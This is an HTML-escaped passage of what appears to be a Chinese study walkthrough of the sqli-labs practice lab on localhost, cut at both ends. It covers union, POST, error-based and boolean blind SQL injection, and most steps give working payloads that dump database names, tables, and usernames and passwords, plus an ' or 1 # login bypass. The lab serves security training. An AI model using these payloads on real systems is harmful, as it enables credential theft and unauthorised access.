src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144850589-04414fed-b9de-4ce4-b0bf-3d325d039650.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=PPELq&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.33.59.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=976361&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.33.59.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询users表下的字段名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623145039834-7743dbdb-44c1-44fc-803a-398a0b1c29a0.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=BOXoM&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.37.08.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=984305&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.37.08.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询username和password&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,group_concat(username),group_concat(password) from security.users %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623145230171-fcca620a-5358-4912-b0b5-e8fd545d161b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=mHvG7&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.40.18.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=923763&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.40.18.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;或者&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623145467593-1f9c56c9-2407-405f-b59f-74d8af29c466.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=mswHR&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.44.12.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1011728&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.44.12.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;postzhu-ru&quot;&gt;POST注入&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623145784299-641581fa-cd80-42e6-b140-4c644a212f1f.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=mGcwi&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.49.32.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=307022&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.49.32.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;尝试在Username处输入 &#x27; or 1 #&lt;br &#x2F;&gt;登录成功&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623161583451-795502a6-6225-474e-861a-3d6e2970ee5c.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=W9W7r&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.11.44.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=830117&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午10.11.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;尝试利用hackbar，检查网页源码，发现post请求提交的用户名和密码的name分别为uname和passwd&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623161829379-837adf4f-c071-492b-806d-829f43f17b5b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=172&amp;amp;id=i3dTC&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.15.31.png&amp;amp;originHeight=172&amp;amp;originWidth=638&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=36240&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=638&quot; alt=&quot;截屏2021-06-08 下午10.15.31.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在hackbar的Body栏输入 uname=admin&amp;amp;passwd=admin&lt;br &#x2F;&gt;成功登陆&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623162124274-99af2c64-255e-4426-8ee3-51e3614a2f77.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=M8s1X&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.20.49.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=689485&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午10.20.49.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;burpsuite同理，略&lt;&#x2F;p&gt;
&lt;p&gt;利用union进行注入，Body中uname处填写 yyds&#x27; union select 1,database() #&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623163437527-881276da-1eb0-47d1-afbc-050d380a9dbd.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=QMkKB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.43.44.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=710245&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午10.43.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到数据库为security&lt;br &#x2F;&gt;通过分析可以得出，这里的SQL语句为&lt;br &#x2F;&gt;@$sql=&amp;quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27;or&#x27;1&#x27;=&#x27;1# and password=&#x27;$passwd&#x27; LIMIT 0,1&amp;quot;;&lt;br &#x2F;&gt;前面yyds处应设置一个数据库中没有的用户名来使界面显示置空，从而填充union select查询得出的数据&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;使用报错注入&lt;br &#x2F;&gt;报错注入所使用的count(&lt;em&gt;)和group by的处理过程，是先由group by将数据分组，然后再由count(&lt;&#x2F;em&gt;)统计每一组的数量&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;uname=admin&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),version()) %23&amp;amp;passwd=123456&lt;br &#x2F;&gt;可以获得版本&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623245642296-b84fc129-0651-45a2-9817-f0347d93add3.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=Bggd2&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.33.27.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=581324&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午9.33.27.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;加入0x7e使结果更便于查看&lt;br &#x2F;&gt;uname=admin&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),0x7e,version(),0x7e) %23&amp;amp;passwd=123456&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623245800903-ae9dfc12-d26f-4ed8-81af-65a7a5e9f169.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=gOPe3&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.36.26.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=583136&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午9.36.26.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询表名（将version()处改变即可）&lt;br &#x2F;&gt;uname=admin&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e) %23&amp;amp;passwd=123456&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623246866165-440f53e9-8ec1-4f3e-b928-a23aaa16c4b6.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=g33Ew&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.54.13.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=598452&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午9.54.13.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;依次改变limit后的第一个数字，依次查询得出所有的表&lt;&#x2F;p&gt;
&lt;h2 id=&quot;zi-fu-xing-zhu-ru&quot;&gt;字符型注入&lt;&#x2F;h2&gt;
&lt;p&gt;（单引号、双引号、括号）&lt;br &#x2F;&gt;输入 ?id=1&#x27; 判断注入类型&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623174071177-c2ab0a30-2ad8-472c-8052-3a0e77268446.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=jBmOy&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.40.57.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=678192&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午1.40.57.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623174086034-a809916f-e79b-4dbd-aaab-87de99c0fdcd.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=278&amp;amp;id=SqXEI&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.40.45.png&amp;amp;originHeight=278&amp;amp;originWidth=590&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=15286&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=590&quot; alt=&quot;截屏2021-06-09 上午1.40.45.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在错误回显中（两个单引号之间）判断处为单引号字符型注入&lt;br &#x2F;&gt;利用order by判断列数&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623174588830-11676235-6277-40be-959c-704a80188ea0.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=VB74c&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.48.55.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=683065&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午1.48.55.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询数据库名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-1&#x2F;?id=&#x27; union select 1,group_concat(schema_name),database() from information_schema.schemata --+&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623174935213-9b2ff540-3ed7-4bd4-96e7-699e7a40782b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=xYOuI&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.55.11.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=725225&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午1.55.11.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询security库中的数据表名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-1&#x2F;?id=&#x27; union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623175217995-f57d3561-22f6-4c9b-9ca4-05c72ce00097.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=qAYVl&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.00.00.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=717345&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午2.00.00.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询users表中的列&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-1&#x2F;?id=&#x27; union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623175500990-1c4d8f0a-a667-4b6f-a7c0-43baea7a50fe.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=dOHPv&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.04.46.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=724281&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午2.04.46.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询username和password&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-1&#x2F;?id=&#x27; union select 1,group_concat(concat_ws(&#x27;:&#x27;,username,password)),database() from users  --+&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623175866998-ae672970-7bdd-4f42-920b-31d68e1cf084.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=KkPSQ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.10.42.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=754091&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午2.10.42.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623176131530-e4ac76d8-658b-4b27-9c54-a022ee3b2461.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=Tk0Uq&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.15.15.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=856109&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午2.15.15.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;同样的，根据报错判断所传递的数据被什么符号包裹&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623176202580-2c2bc1ba-54f5-4cf6-846f-e0f738774484.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=oWyNY&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.15.01.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=941124&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 上午2.15.01.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-4&#x2F;?id=1“) %23&lt;br &#x2F;&gt;判断出1被“和）包裹，即 (&amp;quot;1&amp;quot;)&lt;&#x2F;p&gt;
&lt;p&gt;剩余步骤与前两道相同，略&lt;&#x2F;p&gt;
&lt;h2 id=&quot;mang-zhu&quot;&gt;盲注&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;bu-er-mang-zhu&quot;&gt;布尔盲注&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623247647163-6c26d6d6-8aa0-4f14-a4f7-4ece5c6a6aa1.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=pTp71&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.07.12.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=890799&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.07.12.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-5&#x2F;?id=1&#x27; and 0 %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623247610627-bad53856-1458-4c10-ba2a-940bdd3adb1c.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=q8sYg&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.05.50.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=950839&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.05.50.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询version&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-5&#x2F;?id=0&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623248145606-35d260fe-c112-476c-b4ff-9bdb75f8489b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=caIa9&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.15.05.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=973035&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.15.05.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;获取到版本的第一个字符为5，以此类推获取全部字符即可&lt;br &#x2F;&gt;获取表名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-5&#x2F;?id=0&#x27; or ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)=&#x27;e&#x27;) %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623249132290-0b35bcfc-aaf3-490c-9c3d-831b02ea02fd.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=u4Rze&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.31.52.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=983898&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.31.52.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;或者将字符转换成ascii码数字用二分法进行判断&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-5&#x2F;?id=0&#x27; or ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&amp;gt;100) %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623249435049-e6a851d6-aadf-47fd-8840-47085c21d0c2.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=C0Rgo&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.36.07.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=984656&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.36.07.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;得到字符的ascii码为101，即e&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-5&#x2F;?id=0&#x27; or ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101) %23&lt;br &#x2F;&gt;&lt;img 